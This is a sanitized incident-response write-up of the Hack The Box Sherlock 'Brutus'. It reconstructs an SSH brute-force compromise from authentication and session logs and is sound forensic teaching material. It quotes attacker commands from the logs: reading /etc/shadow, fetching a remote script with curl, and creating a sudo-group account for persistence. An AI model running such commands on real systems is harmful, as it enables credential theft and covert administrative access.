---
title: "Brutus — SSH Compromise Timeline and Persistence Analysis"
description: "Sanitized HTB Sherlock case study covering SSH authentication analysis, session correlation, and privileged-account persistence."
type: case-study
platform: Hack The Box
content_type: sherlock
status: published-ready
addedAt: "2026-09-14"
tags:
  - dfir
  - soc
  - linux
  - ssh
---

## Summary

Brutus is a Hack The Box Sherlock focused on reconstructing an SSH compromise from authentication and session records. The analysis correlates an authentication burst, successful privileged access, session activity, and creation of a privileged local account. All identities, addresses, and sensitive values are replaced with role-based placeholders.

## Context and Objective

The supplied evidence consisted of plaintext authentication logs and legacy session-accounting data converted for analysis. The objective was to establish a defensible incident timeline, identify persistence activity, and distinguish observed actions from unverified follow-on impact. Timestamps were interpreted in UTC where the session-record query specified it.

## Approach and Evidence

### Authentication Volume Triage

**Observation.** Authentication records showed an unusually high volume of SSH daemon events relative to other services.

**Action.** Service names were counted to prioritize the authentication source.

```bash
awk '{print $5}' <AUTH_LOG> | cut -d'[' -f1 | cut -d: -f1 | sort | uniq -c | sort -nr
# 257 sshd
# 104 CRON
```

**Significance.** The concentration of SSH events justified focused review of failed and accepted authentication activity.

**Result.** The notes report that the log contained 385 lines and that SSH activity dominated the anomaly.

### Successful Access and Session Correlation

**Observation.** Accepted-password events tied repeated successful access to one external source and a privileged account.

**Action.** Accepted events were filtered, then correlated with session-accounting records.

```bash
grep 'Accepted' <AUTH_LOG>
# <DATE> <TIME> ... Accepted password for <PRIVILEGED_ACCOUNT> from <EXTERNAL_SOURCE> ...

TZ=UTC wtmpdb last -F -f <WTMP_DATABASE>
# <PRIVILEGED_ACCOUNT> pts/1 <EXTERNAL_SOURCE> <UTC_START> - <UTC_END> (<DURATION>)
```

**Significance.** Matching authentication and terminal-session records bounds an interactive privileged session more reliably than either artifact alone.

**Result.** The notes report an initial short-lived successful authentication, followed by an interactive privileged session beginning one second after the corresponding authentication event and lasting 279 seconds.

### Privileged Account Persistence

**Observation.** Account-management records showed creation of a new local account followed by addition to an administrative group.

**Action.** Account-creation and group-modification events were extracted from the authentication log.

```bash
grep -E 'useradd.*new user|usermod.*sudo' <AUTH_LOG>
# useradd[<PID>]: new user: name=<PERSISTENCE_ACCOUNT>, UID=<UID>, ...
# usermod[<PID>]: add '<PERSISTENCE_ACCOUNT>' to group 'sudo'
```

**Significance.** A newly created account granted administrative-group membership is evidence of durable local persistence. This behavior maps to MITRE ATT&CK T1136.001, Create Account: Local Account.

**Result.** The notes report that the new account was later used for successful SSH authentication, supporting that persistence was operational.

### Post-Compromise Activity

**Observation.** Privileged command records showed credential-store access and retrieval of an enumeration script.

**Action.** Recorded privileged commands were reviewed.

```bash
grep 'COMMAND=' <AUTH_LOG>
# sudo: <PERSISTENCE_ACCOUNT> : ... COMMAND=/usr/bin/cat /etc/shadow
# sudo: <PERSISTENCE_ACCOUNT> : ... COMMAND=/usr/bin/curl <REMOTE_SCRIPT_URL>
```

**Significance.** Reading the local credential store indicates credential-access activity; retrieving an enumeration script indicates discovery preparation. The evidence does not establish whether the script executed or what it produced.

**Result.** The notes report both commands after the initial privileged session and a subsequent login by the persistence account.

## Challenges and Decisions

The legacy session file required conversion to a queryable database before use. The notes report that querying the original legacy file directly failed because it was not a database, so the analysis used the converted session database. No audit-policy changes or log-clearing evidence was observed within supplied artifacts.

## Outcome

The notes report a confirmed compromise sequence: SSH password attacks, privileged interactive access, creation of an administrative local account, credential-store access, and enumeration-tool retrieval. The evidence bounds the first interactive session but does not establish script execution, additional persistence mechanisms, credential reuse, or impact beyond supplied artifacts.

## Lessons and Recommendations

- Detect SSH authentication-failure bursts followed by successful access from the same source.
- Alert when a new local account is added to an administrative group.
- Investigate non-baseline privileged reads of credential stores and external script retrieval.
- Recommended response: isolate affected systems, disable unauthorized accounts, rotate affected credentials, review authorized keys, privilege configuration, scheduled tasks, and broader session records.

## References

- Hack The Box Sherlock: [Brutus](https://app.hackthebox.com/sherlocks/Brutus)
- MITRE ATT&CK T1136.001, Create Account: Local Account
